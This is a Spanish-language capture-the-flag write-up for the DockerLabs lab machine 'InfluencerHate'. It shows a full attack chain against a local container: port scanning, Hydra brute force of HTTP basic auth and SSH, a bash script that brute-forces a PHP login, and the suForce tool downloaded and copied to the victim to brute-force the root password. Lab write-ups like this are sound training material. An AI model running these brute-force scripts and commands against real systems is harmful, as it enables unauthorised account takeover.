# 🖥️ Writeup - InfluencerHate 

**Plataforma:** Dockerlabs  
**Sistema Operativo:** Linux  

# INSTALACIÓN

Descargamos el `.zip` de la máquina desde DockerLabs a nuestro entorno y seguimos los siguientes pasos.

```bash 
unzip influencerhate.zip
```
La máquina ya está descomprimida y solo falta montarla.

```bash
sudo bash auto_deploy.sh influencerhate.tar
``` 
Info:

```

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
``` 

Una vez desplegada, cuando terminemos de hackearla, con un `Ctrl + C` se eliminará automáticamente para que no queden archivos residuales.

# ESCANEO DE PUERTOS

A continuación, realizamos un escaneo general para comprobar qué puertos están abiertos y luego uno más exhaustivo para obtener información relevante sobre los servicios.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 172.17.0.2
``` 

```bash
nmap -n -Pn -sCV -p22,80 --min-rate 5000 172.17.0.2
```

Info:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-09 18:26 CEST
Nmap scan report for 172.17.0.2
Host is up (0.000028s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u6 (protocol 2.0)
| ssh-hostkey: 
|   256 86:ba:77:96:38:4e:54:22:d9:09:f1:03:17:bd:52:43 (ECDSA)
|_  256 28:b4:8b:66:08:67:77:f9:b0:f6:c2:94:58:34:dd:47 (ED25519)
80/tcp open  http    Apache httpd 2.4.62
| http-auth: 
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Zona restringida
|_http-server-header: Apache/2.4.62 (Debian)
|_http-title: 401 Unauthorized
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.84 seconds
```

Cuando accedemos al puerto `80` vemos que no estamos autorizados para visualizar la página, ya que requiere un `usuario` y una `contraseña`.

Vamos a intentar aplicar fuerza bruta al panel de `login`, teniendo en cuenta que el formato del diccionario que debemos utilizar es `usuario:contraseña`.

Disponemos de un diccionario por defecto con este formato llamado `ftp-betterdefaultpasslist.txt`. Si no encontramos credenciales válidas, también podemos adaptar cualquier otro diccionario para darle este formato.

# HYDRA

```bash
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 172.17.0.2 http-get / -t 64
```

Info:
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-09 18:40:12
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 66 login tries, ~2 tries per task
[DATA] attacking http-get://172.17.0.2:80/
[80][http-get] host: 172.17.0.2   login: httpadmin   password: fhttpadmin
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-09 18:40:23
```
Tras la prueba, obtenemos las credenciales: `httpadmin` : `fhttpadmin`.

Una vez dentro nos encontramos con la página por defecto de `Apache2`.

# GOBUSTER

Procedemos a buscar directorios o archivos ocultos en la web con  `Gobuster`, pero para ello es necesario proporcionar también el `header` con el `usuario` y la `contraseña` de autenticación.

Para obtener dicho header interceptamos la petición con `BurpSuite`.

Info:
```
GET / HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=
Connection: keep-alive
Upgrade-Insecure-Requests: 1
If-Modified-Since: Sat, 28 Jun 2025 11:36:18 GMT
If-None-Match: "29cd-638a033f6d080-gzip"
Priority: u=0, i
```

La línea que nos interesa es la siguiente:

```
Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=
```

```bash
echo "aHR0cGFkbWluOmZodHRwYWRtaW4=" | base64 -d
```

Info:
```
httpadmin:fhttpadmin
```

Al decodificar el string en `Base64` vemos que contiene las credenciales, por lo que es el header que necesitamos para poder realizar el fuzzing de directorios.

```bash
gobuster dir -u http://172.17.0.2/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html -H "Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4=" -k -t 50
```

Info:
```
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 10701]
/login.php            (Status: 200) [Size: 2798]
/server-status        (Status: 403) [Size: 275]
```

# FUERZA BRUTA
Existe un `login.php`, así que volvemos a intentar un ataque de fuerza bruta.

![alt text](../../images/login.png)

Para ello creamos un `script` en `bash` llamado `fuerza_bruta.sh`.

```bash
#!/bin/bash

URL="http://172.17.0.2/login.php"
USER="admin"
WORDLIST="/usr/share/wordlists/rockyou.txt"
AUTH="Authorization: Basic aHR0cGFkbWluOmZodHRwYWRtaW4="
FAIL="Credenciales incorrectas."

while read -r PASS; do
  echo "Probando: $PASS"
  RESP=$(curl -s -X POST "$URL" -H "$AUTH" -d "username=$USER&password=$PASS")
  if [[ "$RESP" != *"$FAIL"* ]]; then
    echo "[+] Contraseña encontrada: $USER:$PASS"
    exit 0
  fi
done < "$WORDLIST"

echo "[-] No encontrada en el diccionario."

```

Probamos con el usuario `admin` y el diccionario `rockyou.txt` para la contraseña.

```bash
chmod +x fuerza_bruta.sh
./fuerza_bruta.sh
```

Info:
```
Probando: 123456
Probando: 12345
Probando: 123456789
Probando: password
Probando: iloveyou
Probando: princess
Probando: 1234567
Probando: rockyou
Probando: 12345678
Probando: abc123
Probando: nicole
Probando: daniel
Probando: babygirl
Probando: monkey
Probando: lovely
Probando: jessica
Probando: 654321
Probando: michael
Probando: ashley
Probando: qwerty
Probando: 111111
Probando: iloveu
Probando: 000000
Probando: michelle
Probando: tigger
Probando: sunshine
Probando: chocolate
[+] Contraseña encontrada: admin:chocolate
```

De esta manera encontramos las credenciales de acceso al login: `admin` : `chocolate`.


Una vez introducidas las credenciales aparece un mensaje que nos hace pensar que existe un usuario del sistema llamado `balutin`.

```
¡Login correcto! Enhorabuena! De parte del usuario balutin, te damos la enhorabuena
```

Siguiendo con la línea de ataques, utilizamos `Hydra` para realizar fuerza bruta por `SSH`.

```bash
hydra -l balutin -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh
```

Info:
```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-10 15:33:23
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: balutin   password: estrella
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 3 final worker threads did not complete until end.
[ERROR] 3 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
```

Encontramos las credenciales para el usuario `balutin` : `estrella`.

Accedemos por `SSH`.

# ESCALADA DE PRIVILEGIOS

Una vez dentro, comprobamos permisos `sudo`, `SUID`, `Capabilities`.

No encontramos nada relevante.

Seguimos buscando sin éxito, así que probamos otro ataque de fuerza bruta, esta vez al usuario `root` desde la sesión de `balutin`.

Descargamos el script `suForce` de `GitHub` en nuestra máquina atacante.


```bash
wget --no-check-certificate -q "https://raw.githubusercontent.com/d4t4s3c/suForce/refs/heads/main/suForce"
```

Transferimos el script y el diccionario `rockyou.txt` a la máquina víctima mediante `scp`.

```bash
scp suForce balutin@172.17.0.2:/tmp/
scp /usr/share/wordlists/rockyou.txt balutin@172.17.0.2:/tmp/
```

Nos movemos al directorio `/tmp` de la máquina víctima.

```bash
chmod +x suForce
./suForce -u root -w rockyou.txt
```

Info:
```
            _____                          
 ___ _   _ |  ___|__  _ __ ___ ___   
/ __| | | || |_ / _ \| '__/ __/ _ \ 
\__ \ |_| ||  _| (_) | | | (_|  __/  
|___/\__,_||_|  \___/|_|  \___\___|  
───────────────────────────────────
 code: d4t4s3c     version: v1.0.0
───────────────────────────────────
🎯 Username | root
📖 Wordlist | rockyou.txt
🔎 Status   | 8/14344392/0%/rockyou
💥 Password | rockyou
───────────────────────────────────
```

Con este ataque logramos encontrar las credenciales de `root` : `rockyou`.

```bash
su root
```

Info:
```
root@4fd4c5ded6c2:/tmp# whoami
root
root@4fd4c5ded6c2:/tmp#
```

Ya somos root!